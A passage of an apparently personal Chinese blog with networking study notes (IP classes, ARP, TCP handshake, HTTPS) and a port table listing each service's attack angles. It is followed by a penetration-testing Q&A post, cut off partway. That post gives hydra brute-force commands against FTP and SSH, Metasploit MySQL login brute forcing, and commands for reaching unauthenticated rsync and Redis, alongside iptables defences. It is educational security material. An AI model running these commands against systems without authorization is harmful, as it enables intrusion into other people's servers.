<td>1</td>
<td>126</td>
<td>1600万</td>
</tr>
<tr>
<td>B类</td>
<td>16383  (2^14-1)</td>
<td>128.1</td>
<td>191.255</td>
<td>65534</td>
</tr>
<tr>
<td>C类</td>
<td>2^21 -1</td>
<td>192.0.1</td>
<td>223.255.255</td>
<td>254</td>
</tr>
</tbody></table>
<p> <strong>特殊的IP地址</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#这三个网段是私有地址，可以用于自己组网使用，这些地址主要用于企业内部网络中</span></span><br><span class="line"><span class="comment">#而使用这三个网段的计算机要上网必须要通过地址翻译（NAT），将私有地址翻译成公用合法的IP地址</span></span><br><span class="line"><span class="number">10</span>.*.*.*    <span class="number">172.16</span>.*.*    <span class="number">172.31</span>.*.*   <span class="number">192.168</span>.*.*  </span><br><span class="line"></span><br><span class="line"><span class="comment">#如果你的主机使用了DHCP功能自动获得一个ip地址，那么当你的DHCP服务器发生故障或响应时间太长而超出系统规定的一个时间，windows系统会为你分配这样一个地址</span></span><br><span class="line"><span class="number">169.254</span>.*.*</span><br><span class="line"></span><br><span class="line"><span class="comment">#限制广播地址。对本机来说，这个地址指本网段内(同一广播域)的所有主机。如果翻译成人类的语言，应该是这样：“这个房间里的所有人都注意了！”这个地址不能被路由器转发。</span></span><br><span class="line"><span class="number">255.255</span>.<span class="number">255.255</span></span><br></pre></td></tr></table></figure>

<p>在同一个局域网上的主机或路由器 他们IP地址的网络号必须是一样</p>
<p>路由器总是具有<strong>两个或两个以上的IP地址</strong>。 路由器的每一个接口都有一个不同网络号的IP地址</p>
<hr>
<h3 id="地址解析协议-ARP"><a href="#地址解析协议-ARP" class="headerlink" title="地址解析协议 ARP"></a><strong>地址解析协议 ARP</strong></h3><p>数据链路层的帧 必须使用硬件地址</p>
<p>每一个主机都有一个 ARP 高速缓存(ARP cache) </p>
<p>– 映射表–存放局域网上的各主机、路由器的 IP 地址和 硬件地址 </p>
<p>– 减少网络上的通信量 </p>
<p>• 主机 A 向本网的主机 B 发送 IP 数据报 </p>
<p>根据IP地址查找 ARP 高速缓存 </p>
<p>– 如有，将硬件地址写入 MAC 帧</p>
<p>– 如没有，ARP请求广播，如下图</p>
<img src="/2020/04/17/%E8%AE%A1%E7%BD%91%E5%9F%BA%E7%A1%80/1.png" style="zoom:80%;">

<p>• ARP 是解决<strong>同一个局域网上</strong>的主机或路由器 的 IP 地址和硬件地址的映射问题</p>
<p> • 如果所要找的主机和源主机不在同一个局域网上，那么网关来了</p>
<p> <strong>• 网关-</strong>-网络层以上使用的中间设备，很少用 </p>
<p>​          –路由器的旧称</p>
<p><strong>• 使用 ARP 的四种典型情况</strong></p>
<p> • 发送方是主机，要把IP数据报发送到本网络上的另一个主 机。这时用 ARP 找到目的主机的硬件地址。 </p>
<p>• 发送方是主机，要把 IP 数据报发送到另一个网络上的一个主机。这时用 ARP 找到网关硬件地址。剩下的工作由 网关来完成。 </p>
<p>• 发送方是路由器，要把 IP 数据报转发到本网络上的一个主机。这时用 ARP 找到目的主机的硬件地址。</p>
<p>• 发送方是路由器，要把 IP 数据报转发到另一个网络上的一个主机。这时用 ARP 找到本网络上另一个路由器的硬 件地址。剩下的工作由这个路由器来完成</p>
<hr>
<h3 id="划分子网"><a href="#划分子网" class="headerlink" title="划分子网"></a><strong>划分子网</strong></h3><p>早期IP 地址的设计确实不够合理<br>– 两级的 IP 地址不够灵活<br>– IP 地址空间的利用率有时很低<br>– 路由表太大，网络性能差</p>
<p><strong>划分子网(subnetting)</strong></p>
<p>– 互联网的正式标准协议 </p>
<p>– 在 IP 地址中增加 “子网号字段” subnet-id </p>
<p>– 子网号是借用若干位的主机号 </p>
<p>– 两级IP 地址变为三级 IP 地址<br>IP地址 ::= {&lt;网络号&gt;, &lt;子网号&gt;, &lt;主机号&gt;}</p>
<p>通常 划分子网是一个单位内部事情 外网看不见划分情况 </p>
<p>这个单位对外仍然表现为一个网络。 </p>
<p>– 从其他网络发送给本单位某个主机的 IP 数据报 </p>
<p>– 仍然根据 IP 数据报的<strong>目的网络号 net-id</strong>，先找到连接 在本单位网络上的路由器</p>
<p>– 单位网<strong>路由器</strong>收到后，再按目的网络号 net-id 和子网 号 subnet-id 找到目的子网</p>
<p>– 最后将 IP 数据报直接交付目的主机</p>
<p><strong>如何判断是否划分子网？</strong></p>
<p>• 从IP数据报的首部无法判断 </p>
<p><strong>• 使用子网掩码(subnet mask)</strong></p>
<hr>
<h2 id="运输层"><a href="#运输层" class="headerlink" title="运输层"></a><strong>运输层</strong></h2><p>TCP/IP 的运输层有两个不同的协议： </p>
<p><strong>(1)用户数据报协议 UDP   (User Datagram Protocol)</strong> </p>
<p>– 当运输层采用无连接的 UDP 协议时，这种逻辑通信信 道是一条不可靠信道。 </p>
<p><strong>(2) 传输控制协议 TCP     (Transmission Control Protocol)</strong> </p>
<p>– 当运输层采用面向连接的 TCP 协议时，尽管下面的网络是不可靠的（只提供尽最大努力服务），但这种逻辑通信信道就相当于一条全双工的可靠信道。</p>
<p>TCP 最主要的特点 </p>
<p>• TCP 是面向连接的           <strong>• 每一条 TCP 连接只能有两个端点</strong> 只能是点对点（一对一）</p>
<p>• TCP 提供可靠交付的服务 <strong>无差错，不丢失，不重复，按序到达</strong></p>
<p>• TCP 提供全双工通信 • TCP 是面向字节流的</p>
<h3 id="三次握手建立-TCP-连接"><a href="#三次握手建立-TCP-连接" class="headerlink" title="三次握手建立 TCP 连接"></a><strong>三次握手建立 TCP 连接</strong></h3><p><strong>A 的 TCP 向 B</strong> 发出连接请求报文段，其首部中的同步位 SYN = 1，并选择序号 seq = x，</p>
<p>表明传送数据时的第一个数据字节的序号是 x。</p>
<p><strong>B 的 TCP 收到连接</strong>请求报文段后，如同意，则 发回确认。</p>
<p>B 在确认报文段中应使 SYN = 1，使 ACK = 1， 其确认号ack = x + 1，自己选择的序号 seq = y。</p>
<p><strong>A 收到此报文段后</strong>向 B 给出确认，其ACK = 1， 确认号 ack = y + 1,  A 的 TCP 通知上层应用进程，连接已经建立</p>
<p><strong>B 的 TCP 收到主机A 的确认后</strong>，也通知其上层 应用进程：TCP 连接已经建立。</p>
<p>第一次握手：客户端尝试连接服务器，向服务器发送syn包（同步序列编号），syn=j，其进入SYN_SEND 状态等待服务器确认：我已准备好，随时出发！</p>
<p>第二次握手：服务器接收客户端 syn 包并确认（ack=j+1），同时向客户端发送一个 syn 包（syn=k），也即 syn + ack 包，此时服务器进入SYN_RECV 状态：收到请求，随时接收。</p>
<p>第三次握手：客户端收到服务器的 syn + ack 包，向服务器发送确认包 ack(ack=k+1），此包发送完毕，客户端和服务器进入ESTABLISHED 状态，完成三次握手：OK，我知道了，那我们开始发送数据。</p>
<img src="/2020/04/17/%E8%AE%A1%E7%BD%91%E5%9F%BA%E7%A1%80/2.png" style="zoom:80%;">

<hr>
<p>三类端口 </p>
<p>• 熟知端口，数值一般为 0~1023。 </p>
<p>• 登记端口号，数值为1024~49151，为没有熟知 端口号的应用程序使用的。使用这个范围的端口 号必须在 IANA 登记，以防止重复。 </p>
<p>• 客户端口号或短暂端口号，数值为49152~65535， 留给客户进程选择暂时使用。当服务器进程收到 客户进程的报文时，就知道了客户进程所使用的 动态端口号。通信结束后，这个端口号可供其他 客户进程以后使</p>
<h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a><strong>应用层</strong></h2><p>超文本传送协议 HTTP<br>• 用户点击鼠标后所发生的事件</p>
<p> (1) 浏览器分析超链指向页面的 URL。</p>
<p> (2) 浏览器向 DNS 请求解析 <a href="http://www.tsinghua.edu.cn" target="_blank" rel="noopener">www.tsinghua.edu.cn</a> 的 IP 地址。</p>
<p> (3) 域名系统 DNS 解析出清华大学服务器的 IP 地址。</p>
<p> (4) 浏览器与服务器建立 TCP 连接 </p>
<p>(5) 浏览器发出取文件命令： GET /chn/yxsz/index.htm。</p>
<p> (6) 服务器给出响应，把文件 index.htm 发给浏览器。</p>
<p> (7) TCP 连接释放。 </p>
<p>(8) 浏览器显示“清华大学院系设置”文件 index.htm 中的所 有文本。</p>
<h3 id="HTTPS加密协议过程："><a href="#HTTPS加密协议过程：" class="headerlink" title="HTTPS加密协议过程："></a><strong>HTTPS加密协议过程：</strong></h3><p>① 客户端将它所支持的算法列表和一个用作产生密钥的随机数发送给服务器；</p>
<p>② 服务器从算法列表中选择一种加密算法，并将它和一份包含<a href="https://baike.baidu.com/item/服务器/100571" target="_blank" rel="noopener">服务器</a>公用密钥的证书发送给<a href="https://baike.baidu.com/item/客户端/101081" target="_blank" rel="noopener">客户端</a>；该证书还包含了用于认证目的的服务器标识，服务器同时还提供了一个用作产生密钥的随机数；</p>
<p>③ 客户端对服务器的证书进行验证（有关验证证书，可以参考<a href="https://baike.baidu.com/item/数字签名/212550" target="_blank" rel="noopener">数字签名</a>），并抽取服m务器的公用密钥；然后，再产生一个称作 pre_master_secret 的随机密码串，并使用服务器的公用密钥对其进行加密（参考非对称加 / 解密），并将加密后的信息发送给服务器；</p>
<p>④ 客户端与服务器端根据 pre_master_secret 以及客户端与服务器的随机数值独立计算出加密和 <a href="https://baike.baidu.com/item/MAC/173" target="_blank" rel="noopener">MAC</a>密钥（参考 DH密钥交换算法） ；</p>
<p>⑤ 客户端将所有握手消息的 MAC 值发送给服务器；</p>
<p>⑥ 服务器将所有握手消息的 MAC 值发送给客户端。</p>
<hr>
<h2 id="常用端口"><a href="#常用端口" class="headerlink" title="常用端口"></a><strong>常用端口</strong></h2><h3 id="文件共享服务端口"><a href="#文件共享服务端口" class="headerlink" title="文件共享服务端口"></a><strong>文件共享服务端口</strong></h3><table>
<thead>
<tr>
<th><strong>端口号</strong></th>
<th><strong>端口说明</strong></th>
<th><strong>利用方向</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>21/69</strong></td>
<td><strong>FTP/TFTP 文件传输协议</strong></td>
<td><strong>允许匿名上传、下载、爆破和嗅探</strong></td>
</tr>
<tr>
<td><strong>2049</strong></td>
<td><strong>NFS 服务</strong></td>
<td><strong>配置不当</strong></td>
</tr>
<tr>
<td><strong>139</strong></td>
<td><strong>Samba 服务</strong></td>
<td><strong>爆破、未授权访问、远程代码执行</strong></td>
</tr>
<tr>
<td><strong>389</strong></td>
<td><strong>LDAP 目录访问协议</strong></td>
<td><strong>注入、允许匿名访问、弱口令</strong></td>
</tr>
</tbody></table>
<h3 id="远程连接服务器端口"><a href="#远程连接服务器端口" class="headerlink" title="远程连接服务器端口"></a><strong>远程连接服务器端口</strong></h3><table>
<thead>
<tr>
<th><strong>端口号</strong></th>
<th><strong>端口说明</strong></th>
<th><strong>利用方向</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>22</strong></td>
<td><strong>SSH远程连接</strong></td>
<td><strong>爆破、SSH隧道及内网代理转发、文件传输</strong></td>
</tr>
<tr>
<td><strong>23</strong></td>
<td><strong>Telnet远程登录服务</strong></td>
<td><strong>爆破、嗅探、弱口令</strong></td>
</tr>
<tr>
<td><strong>3389</strong></td>
<td><strong>RDP远程桌面连接</strong></td>
<td><strong>Shift后门(Windows Server 2003以下版本)、爆破</strong></td>
</tr>
<tr>
<td><strong>5900</strong></td>
<td><strong>VNC</strong></td>
<td><strong>弱口令爆破</strong></td>
</tr>
<tr>
<td><strong>5632</strong></td>
<td><strong>PyAnywhere服务</strong></td>
<td><strong>抓密码、代码执行</strong></td>
</tr>
</tbody></table>
<p><strong>22端口：</strong>传统的网络服务程序，如：ftp、pop和telnet在本质上都是不安全的，因为它们在网络上用明文传送口令和数据，别有用心的人非常容易就可以截获这些口令和数据。而且，这些服务程序的安全验证方式也是有其弱点的，就是很容易受到“中间人”（man-in-the-middle）这种方式的攻击。所谓“中间人”的攻击方式，就是“中间人”冒充真正的服务器接收你的传给服务器的数据，然后再冒充你把数据传给真正的服务器。服务器和你之间的数据传送被“中间人”一转手做了手脚之后，就会出现很严重的问题。</p>
<p>SSH的英文全称是Secure  SHell。通过使用SSH，你可以把所有传输的数据进行加密，这样“中间人”这种攻击方式就不可能实现了，而且也能够<strong>防止DNS和IP欺骗</strong>。还有一个额外的好处就是<strong>传输的数据是经过压缩</strong>的，所以可以加快传输的速度。SSH有很多功能，它既可以代替telnet，又可以为ftp、pop、甚至ppp提供一个安全的“通道”。 </p>
<h3 id="Web应用服务端口"><a href="#Web应用服务端口" class="headerlink" title="Web应用服务端口"></a><strong>Web应用服务端口</strong></h3><table>
<thead>
<tr>
<th><strong>端口号</strong></th>
<th><strong>端口说明</strong></th>
<th><strong>利用方向</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>80/443/8080</strong></td>
<td><strong>常见Web服务端口</strong></td>
<td><strong>Web攻击、爆破、对应服务版本漏洞</strong></td>
</tr>
<tr>
<td><strong>7001/70022</strong></td>
<td><strong>Weblogic控制台</strong></td>
<td><strong>Java 反序列化、弱口令</strong></td>
</tr>
<tr>
<td><strong>8080/8089</strong></td>
<td><strong>Jboos/Resin/Jetty/Jenkins</strong></td>
<td><strong>反序列化、控制台弱口令</strong></td>
</tr>
<tr>
<td><strong>9090</strong></td>
<td><strong>WebSphere控制台</strong></td>
<td><strong>Java 反序列化、弱口令</strong></td>
</tr>
<tr>
<td><strong>4848</strong></td>
<td><strong>GlassFish控制台</strong></td>
<td><strong>弱口令</strong></td>
</tr>
<tr>
<td><strong>1352</strong></td>
<td><strong>Lotus dominion邮件服务</strong></td>
<td><strong>弱口令、信息泄露、爆破</strong></td>
</tr>
<tr>
<td><strong>10000</strong></td>
<td><strong>Webmin-Web控制面板</strong></td>
<td><strong>弱口令</strong></td>
</tr>
</tbody></table>
<h3 id="数据库端口"><a href="#数据库端口" class="headerlink" title="数据库端口"></a><strong>数据库端口</strong></h3><table>
<thead>
<tr>
<th>端口号</th>
<th>端口说明</th>
<th>利用方向</th>
</tr>
</thead>
<tbody><tr>
<td><strong>3306</strong></td>
<td><strong>MySQL</strong></td>
<td><strong>注入、提权、爆破</strong></td>
</tr>
<tr>
<td><strong>1433</strong></td>
<td><strong>MSSQL</strong></td>
<td><strong>注入、提权、SAP弱口令、爆破</strong></td>
</tr>
<tr>
<td><strong>1521</strong></td>
<td><strong>Oracle</strong></td>
<td><strong>TNS爆破、注入、反弹Shell</strong></td>
</tr>
<tr>
<td><strong>5432</strong></td>
<td><strong>PostgreSQL</strong></td>
<td><strong>爆破、注入、弱口令</strong></td>
</tr>
<tr>
<td><strong>27017/27018</strong></td>
<td><strong>MongoDB</strong></td>
<td><strong>爆破、未授权访问</strong></td>
</tr>
<tr>
<td><strong>6379</strong></td>
<td><strong>Redis</strong></td>
<td><strong>未授权访问、弱口令爆破</strong></td>
</tr>
<tr>
<td><strong>5000</strong></td>
<td><strong>SysBase/DB2</strong></td>
<td><strong>爆破、注入</strong></td>
</tr>
</tbody></table>
<h3 id="邮件服务端口"><a href="#邮件服务端口" class="headerlink" title="邮件服务端口"></a><strong>邮件服务端口</strong></h3><table>
<thead>
<tr>
<th>端口号</th>
<th>端口说明</th>
<th>利用方向</th>
</tr>
</thead>
<tbody><tr>
<td><strong>25</strong></td>
<td><strong>SMTP 邮件服务</strong></td>
<td><strong>邮件伪造</strong></td>
</tr>
<tr>
<td><strong>109/110</strong></td>
<td><strong>POP2/POP3</strong></td>
<td><strong>爆破、嗅探</strong></td>
</tr>
<tr>
<td><strong>143</strong></td>
<td><strong>IMAP</strong></td>
<td><strong>爆破</strong></td>
</tr>
</tbody></table>
<p>端口说明：<strong>109端口是为POP2（Post Office Protocol Version  2，邮局协议2）服务开放的，110端口是为POP3（邮件协议3）服务开放的，POP2、POP3都是主要用于接收邮件的，目前POP3使用的比较多</strong>，许多服务器都同时支持POP2和POP3。客户端可以使用POP3协议来访问服务端的邮件服务，如今ISP的绝大多数邮件服务器都是使用该协议。在使用电子邮件客户端程序的时候，会要求输入POP3服务器地址，默认情况下使用的就是110端口。</p>
<p>端口漏洞：POP2、POP3在提供邮件接收服务的同时，也出现了不少的漏洞。单单POP3服务在用户名和密码交换缓冲区溢出的漏洞就不少于20个，比如WebEasyMail POP3 Server合法用户名信息泄露漏洞，通过该漏洞远程攻击者可以验证用户账户的存在。另外，110端口也被ProMail  trojan等木马程序所利用，通过110端口可以窃取POP账号用户名和密码。</p>
<p>操作建议：如果是执行邮件服务器，可以打开该端口</p>
<h3 id="网络协议端口"><a href="#网络协议端口" class="headerlink" title="网络协议端口"></a><strong>网络协议端口</strong></h3><table>
<thead>
<tr>
<th>端口号</th>
<th>端口说明</th>
<th>利用方向</th>
</tr>
</thead>
<tbody><tr>
<td><strong>53</strong></td>
<td><strong>DNS域名系统</strong></td>
<td><strong>允许区域传送、DNS劫持、缓存投毒、欺骗</strong></td>
</tr>
<tr>
<td><strong>67/68</strong></td>
<td><strong>DHCP服务</strong></td>
<td><strong>劫持、欺骗</strong></td>
</tr>
<tr>
<td><strong>161</strong></td>
<td><strong>SNMP协议</strong></td>
<td><strong>爆破、搜集目标内网信息</strong></td>
</tr>
</tbody></table>
<h3 id="特殊服务端口"><a href="#特殊服务端口" class="headerlink" title="特殊服务端口"></a><strong>特殊服务端口</strong></h3><table>
<thead>
<tr>
<th>端口号</th>
<th>端口说明</th>
<th>利用方向</th>
</tr>
</thead>
<tbody><tr>
<td><strong>2128</strong></td>
<td><strong>Zookeeper 服务</strong></td>
<td><strong>未授权访问</strong></td>
</tr>
<tr>
<td><strong>8068</strong></td>
<td><strong>Zabbix 服务</strong></td>
<td><strong>远程执行、SQL注入</strong></td>
</tr>
<tr>
<td><strong>9200/9300</strong></td>
<td><strong>Elasticsearch 服务</strong></td>
<td><strong>远程执行</strong></td>
</tr>
<tr>
<td><strong>11211</strong></td>
<td><strong>Memcache 服务</strong></td>
<td><strong>未授权访问</strong></td>
</tr>
<tr>
<td><strong>512/513/514</strong></td>
<td><strong>Linux Rexec 服务</strong></td>
<td><strong>爆破、Rlogin登陆</strong></td>
</tr>
<tr>
<td><strong>873</strong></td>
<td><strong>Rsync 服务</strong></td>
<td><strong>匿名访问、文件上传</strong></td>
</tr>
<tr>
<td><strong>3690</strong></td>
<td><strong>Svn 服务</strong></td>
<td><strong>Svn泄露、未授权访问</strong></td>
</tr>
<tr>
<td><strong>50000</strong></td>
<td><strong>SAP Management Console</strong></td>
<td><strong>远程执行</strong></td>
</tr>
</tbody></table>
<h3 id="端口概念"><a href="#端口概念" class="headerlink" title="端口概念"></a><strong>端口概念</strong></h3><p>在网络技术中，端口（Port）大致有两种意思：一是物理意义上的端口，比如，ADSL  Modem、集线器、交换机、路由器用于连接其他网络设备的接口，如RJ-45端口、SC端口等等。二是逻辑意义上的端口，一般是指TCP/IP协议中的端口，端口号的范围从0到65535，比如用于浏览网页服务的80端口，用于FTP服务的21端口等等。我们这里将要介绍的就是逻辑意义上的端口。</p>
<h3 id="端口分类"><a href="#端口分类" class="headerlink" title="端口分类"></a><strong>端口分类</strong></h3><p>逻辑意义上的端口有多种分类标准，下面将介绍两种常见的分类：</p>
<p><strong>1、按端口号分布划分</strong></p>
<p>（1）知名端口（Well-Known Ports）</p>
<p><strong>知名端口即众所周知的端口号，范围从0到1023</strong>，这些端口号一般固定分配给一些服务。比如21端口分配给FTP服务，25端口分配给SMTP（简单邮件传输协议）服务，80端口分配给HTTP服务，135端口分配给RPC（远程过程调用）服务等等。</p>
<p>（2）动态端口（Dynamic Ports）</p>
<p>　　<strong>动态端口的范围从1024到65535</strong>，这些端口号一般不固定分配给某个服务，也就是说许多服务都可以使用这些端口。只要运行的程序向系统提出访问网络的申请，那么系统就可以从这些端口号中分配一个供该程序使用。比如1024端口就是分配给第一个向系统发出申请的程序。在关闭程序进程后，就会释放所占用的端口号。</p>
<p>　不过，动态端口也常常被病毒木马程序所利用，如冰河默认连接端口是7626、WAY 2.4是8011、Netspy 3.0是7306、YAI病毒是1024等等。</p>
<p><strong>2、按协议类型划分</strong></p>
<p>按协议类型划分，可以分为TCP、UDP、IP和ICMP（Internet控制消息协议）等端口。下面主要介绍TCP和UDP端口：</p>
<p>（1）TCP端口</p>
<p>TCP端口，即传输控制协议端口，需要在客户端和服务器之间建立连接，这样可以提供可靠的数据传输。常见的包括FTP服务的21端口，Telnet服务的23端口，SMTP服务的25端口，以及HTTP服务的80端口等等。</p>
<p>（2）UDP端口</p>
<p>UDP端口，即用户数据包协议端口，无需在客户端和服务器之间建立连接，安全性得不到保障。<strong>常见的有DNS服务的53端口，SNMP（简单网络管理协议）服务的161端口</strong>，QQ使用的8000和4000端口等等。</p>
<h3 id="查看端口"><a href="#查看端口" class="headerlink" title="查看端口"></a><strong>查看端口</strong></h3><p>在Windows 2000/XP/Server 2003中要查看端口，可以使用Netstat命令：</p>
<p>依次点击“开始→运行”，键入“cmd”并回车，打开命令提示符窗口。在命令提示符状态下键入“netstat -a -n”，按下回车键后就可以看到以数字形式显示的TCP和UDP连接的端口号及状态（如图）。</p>
<p>小知识：Netstat命令用法</p>
<p>命令格式：Netstat －a －e －n －o －s</p>
<p><strong>一般用 netstat -ano 来查看使用中的端口</strong></p>
<p>　　－a 表示显示所有活动的TCP连接以及计算机监听的TCP和UDP端口。</p>
<p>　　－e 表示显示以太网发送和接收的字节数、数据包数等。</p>
<p>　　－n 表示只以数字形式显示所有活动的TCP连接的地址和端口号。</p>
<p>　　－o 表示显示活动的TCP连接并包括每个连接的进程ID（PID）。</p>
<p>　　－s 表示按协议显示各种连接的统计信息，包括端口号</p>
<hr>
<p>参考：<a href="https://www.cnblogs.com/zane-s/p/12435873.html" target="_blank" rel="noopener">https://www.cnblogs.com/zane-s/p/12435873.html</a></p>

      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%9F%BA%E7%A1%80/" rel="tag">基础</a></li></ul>


    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-web杂烩" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/04/12/web%E6%9D%82%E7%83%A9/"
    >web杂烩</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/04/12/web%E6%9D%82%E7%83%A9/" class="article-date">
  <time datetime="2020-04-12T14:25:31.000Z" itemprop="datePublished">2020-04-12</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <h3 id="如下端口默认对应的服务，在渗透测试过程中我们可以从哪些角度考虑其安全问题？"><a href="#如下端口默认对应的服务，在渗透测试过程中我们可以从哪些角度考虑其安全问题？" class="headerlink" title="如下端口默认对应的服务，在渗透测试过程中我们可以从哪些角度考虑其安全问题？"></a>如下端口默认对应的服务，在渗透测试过程中我们可以从哪些角度考虑其安全问题？</h3><p><strong>端口：21、22、873、1433、3306、6379、11211</strong> </p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#21端口，弱口令爆破</span></span><br><span class="line">hydra <span class="literal">-l</span> root <span class="literal">-P</span> password.txt <span class="literal">-t</span> <span class="number">5</span> <span class="literal">-vV</span>  <span class="number">192.168</span>.xx ftp</span><br><span class="line"><span class="comment">#发现ftp的版本是proftpd 1.3.3c，该版本存在后门，利用msf中的模块可以进行利用</span></span><br><span class="line">nmap -<span class="literal">-script</span>=vuln <span class="number">192.168</span>.<span class="number">137</span>.* <span class="comment">#发现常见漏洞</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#22端口，弱口令爆破</span></span><br><span class="line">hydra <span class="literal">-l</span> root <span class="literal">-P</span> password.txt <span class="literal">-t</span> <span class="number">5</span> <span class="literal">-vV</span>  <span class="number">192.168</span>.xx ssh</span><br></pre></td></tr></table></figure>

<p><strong>rsync默认的端口是873</strong>，该服务<strong>存在未授权访问漏洞</strong></p>
<p>找到开放端口后，查看时候可默认口令登陆。使用命令查看：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rsync root@192.168.31.69:: 连接rsync</span><br><span class="line">rsync root@192.168.31.69::www 连接rsync并查看www文件夹内的文件</span><br></pre></td></tr></table></figure>

<p>注意两种方式防御，<strong>一是限定访问的IP，另一个是不允许匿名访问，添加用户口令。</strong></p>
<p>限定IP的两种方式</p>
<p><strong>IPTables防火墙</strong></p>
<p><strong>给rsync的端口添加一个iptables</strong>。</p>
<p>只希望能够从内部网络（192.168.101.0/24）访问：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -i eth0 -p tcp -s 192.168.101.0&#x2F;24 --dport 873 -m state --state NEW,ESTABLISHED -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -o eth0 -p tcp --sport 873 -m state --state ESTABLISHED -j ACCEPT</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1433(mssql)、3306(mysql)都是数据库端口，也存在弱口令漏洞，可以用msf试着爆破</span></span><br><span class="line">use auxiliary/scanner/mysql/mysql_login <span class="comment">#使用mysql爆破模块</span></span><br><span class="line">set rhosts <span class="number">192.168</span>.<span class="number">31.69</span> <span class="comment">#设置目标ip</span></span><br><span class="line">set username root <span class="comment">#设置用户名</span></span><br><span class="line">set pass_file /root/passwd.txt <span class="comment">#设置密码字典</span></span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#一般无验证，直接访问</span></span><br><span class="line"><span class="comment">#6379使用的是redis服务，可能存在未授权访问漏洞，利用该漏洞需要安装redis,安装命令如下：</span></span><br><span class="line">wget http://download.redis.io/releases/redis<span class="literal">-2</span>.<span class="number">8.12</span>.tar.gz 下载redis</span><br><span class="line">tar <span class="literal">-xzf</span> redis<span class="literal">-2</span>.<span class="number">8.12</span>.tar.gz 解压</span><br><span class="line">cd redis<span class="literal">-2</span>.<span class="number">8.12</span>/ 切换到解压后的目录下</span><br><span class="line">make 编译</span><br><span class="line">cd /root/redis<span class="literal">-2</span>.<span class="number">8.12</span>/src 切换到这个目录</span><br><span class="line">./redis<span class="literal">-cli</span> <span class="literal">-h</span> <span class="number">192.168</span>.<span class="number">31.69</span> 执行redis<span class="literal">-cli</span>连接</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#只允许本机使用11211</span></span><br><span class="line">iptables <span class="literal">-A</span> INPUT <span class="literal">-p</span> tcp <span class="literal">-s</span> <span class="number">127.0</span>.<span class="number">0.1</span> -<span class="literal">-dport</span> <span class="number">11211</span> <span class="literal">-j</span> ACCEPT</span><br><span class="line">iptables <span class="literal">-A</span> INPUT <span class="literal">-p</span> udp <span class="literal">-s</span> <span class="number">127.0</span>.<span class="number">0.1</span> -<span class="literal">-dport</span> <span class="number">11211</span> <span class="literal">-j</span> ACCEPT</span><br><span class="line"></span><br><span class="line"><span class="comment">#禁止公网入方向11211端口</span></span><br><span class="line">iptables <span class="literal">-I</span> INPUT <span class="literal">-p</span> tcp -<span class="literal">-dport</span> <span class="number">11211</span> <span class="literal">-j</span> DROP</span><br><span class="line">iptables <span class="literal">-I</span> INPUT <span class="literal">-p</span> udp -<span class="literal">-dport</span> <span class="number">11211</span> <span class="literal">-j</span> DROP</span><br><span class="line"></span><br><span class="line"><span class="comment">#保存配置，重启iptables</span></span><br><span class="line">service iptables save</span><br><span class="line">service iptables restart</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="在WEB类安全问题的应急处置过程中web日志溯源攻击路径的思路？"><a href="#在WEB类安全问题的应急处置过程中web日志溯源攻击路径的思路？" class="headerlink" title="在WEB类安全问题的应急处置过程中web日志溯源攻击路径的思路？"></a>在WEB类安全问题的应急处置过程中web日志溯源攻击路径的思路？</h3><p>更好的思路是：<strong>正常总是基本相似 异常却各有各的异常</strong>（来源：<a href="http://www.91ri.org/16614.html）" target="_blank" rel="noopener">http://www.91ri.org/16614.html）</a><br>文中关于此理论已经讲得很详细，这里简单描述一下实现方法：<br>搜集大量正常请求，为每个请求的所有参数的值定义正常模型<br>通过Waf或者攻击规则来剔除所有发起过攻击请求的IP，从而得到所有来自用户的正常请求，将每个正常请求构造出对应的正常模型，比如：<br><a href="http://test.com/index.php?id=123" target="_blank" rel="noopener">http://test.com/index.php?id=123</a><br><a href="http://test.com/index.php?id=124" target="_blank" rel="noopener">http://test.com/index.php?id=124</a><br><a href="http://test.com/index.php?id=125" target="_blank" 